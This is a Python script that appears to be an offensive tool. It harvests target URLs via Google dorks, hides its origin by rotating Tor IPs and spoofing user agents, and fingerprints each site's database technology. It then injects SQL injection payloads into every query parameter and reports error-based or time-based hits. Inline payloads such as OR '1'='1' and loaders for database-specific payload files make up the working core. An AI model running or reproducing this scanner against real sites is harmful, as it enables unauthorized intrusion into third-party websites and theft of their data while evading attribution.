import requests
import random
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from Wappalyzer import Wappalyzer, WebPage
from googlesearch import search  # Import the googlesearch module
import os
from tornet import initialize_environment, change_ip, ma_ip  # Import necessary tornet functions

# Initialize colorama
init()

# Initialize the TorNet environment
initialize_environment()

# List of 6 random user agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18363',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36'
]

def print_banner():
    banner = """
        Made By Unrealisedd                                     
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

def get_google_dorking_parameter():
    dork = input('Enter the Google dorking parameter (e.g., inurl:"?id="): ')
    return dork

def get_number_of_requests():
    while True:
        try:
            num_requests = int(input("Enter the number of requests to make: "))
            return num_requests
        except ValueError:
            print("Please enter a valid number.")

def fetch_urls(dork, num_requests):
    urls = []
    
    for attempt in range(num_requests):
        # Change the IP before each request
        change_ip()
        
        try:
            # Perform the Google search using googlesearch-python
            for url in search(dork, num_results=num_requests):
                # Make a request to the URL to ensure it's valid
                response = requests.get(url, headers={'User-Agent': random.choice(user_agents)}, timeout=10)
                if response.status_code == 200:
                    urls.append(url)
                    print(f"Fetched URL: {url}")
                else:
                    print(f"Failed to fetch URL with status code: {response.status_code}")
        
        except Exception as e:
            print(f"An error occurred while fetching URLs: {e}")
        
        # Pause to prevent excessive requests
        time.sleep(5)
    
    if not urls:
        print("No URLs found.")
    
    return urls

def detect_databases(url):
    try:
        webpage = WebPage.new_from_url(url)
        wappalyzer = Wappalyzer.latest()
        technologies = wappalyzer.analyze(webpage)
        return technologies
    except Exception as e:
        print(f"An error occurred while detecting technologies: {e}")
        return []

def load_payloads(database_technology):
    payload_dir = "payloads"
    db_to_file = {
        "mssql": "mssql.txt",
        "mysql": "mysql.txt",
        "oracle": "oracle.txt",
        "postgresql": "postgresql.txt",
        "generic": "generic.txt",
        "xor": "xor.txt"
    }
    
    if database_technology in db_to_file:
        payload_file = os.path.join(payload_dir, db_to_file[database_technology])
    else:
        # If the database technology is not recognized, load all payload files
        payloads = []
        for file_name in db_to_file.values():
            try:
                with open(os.path.join(payload_dir, file_name), 'r') as file:
                    payloads.extend(file.read().splitlines())
            except FileNotFoundError:
                print(f"Payload file not found: {file_name}")
        return payloads

    try:
        with open(payload_file, 'r') as file:
            payloads = file.read().splitlines()
    except FileNotFoundError:
        print(f"Payload file not found: {payload_file}")
        payloads = []

    return payloads

def is_vulnerable_to_sqli(url):
    technologies = detect_databases(url)
    db_detected = False

    if technologies:
        technologies_lower = [tech.lower() for tech in technologies]
        print(Fore.YELLOW + f"Technologies detected: {', '.join(technologies_lower)}" + Style.RESET_ALL)
        
        for tech in technologies_lower:
            if tech in ["mssql", "mysql", "oracle", "postgresql"]:
                db_detected = True
                payloads = load_payloads(tech)
                break
        else:
            payloads = load_payloads("generic")
    else:
        payloads = load_payloads("generic")

    if not db_detected:
        # Basic error-based payloads
        basic_payloads = ["'", '"', "''", '""', "' OR '1''='1'", '" OR "1"="1"']
        payloads = basic_payloads + payloads + load_payloads("xor")

    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    
    for param in query_params:
        for payload in payloads:
            query_params_copy = query_params.copy()
            query_params_copy[param] = [payload]

            new_query = urlencode(query_params_copy, doseq=True)
            test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))

            try:
                response = requests.get(test_url, timeout=10, allow_redirects=False)  # Increase timeout duration
                if response.status_code in [301, 302, 303, 307, 308]:
                    continue
                if ("syntax error" in response.text.lower() or "mysql" in response.text.lower() or "sql" in response.text.lower()):
                    return "error-based"
                if 5 <= response.elapsed.total_seconds() <= 6:
                    return "time-based"
            except requests.exceptions.RequestException as e:
                print(f"An error occurred while testing URL: {e}")
    return False

def main():
    print_banner()
    dork = get_google_dorking_parameter()
    num_requests = get_number_of_requests()

    # Fetch URLs using googlesearch-python and tor with IP changing
    urls = fetch_urls(dork, num_requests)

    print(f"Testing {len(urls)} URLs for SQL injection vulnerabilities...")

    for url in urls:
        print(f"Testing URL: {url}")
        result = is_vulnerable_to_sqli(url)
        if result == "error-based":
            print(Fore.GREEN + f"Vulnerable to SQL injection (Error-based): {url}" + Style.RESET_ALL)
        elif result == "time-based":
            print(Fore.GREEN + f"Vulnerable to SQL injection (Time-based): {url}" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Not vulnerable to SQL injection: {url}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
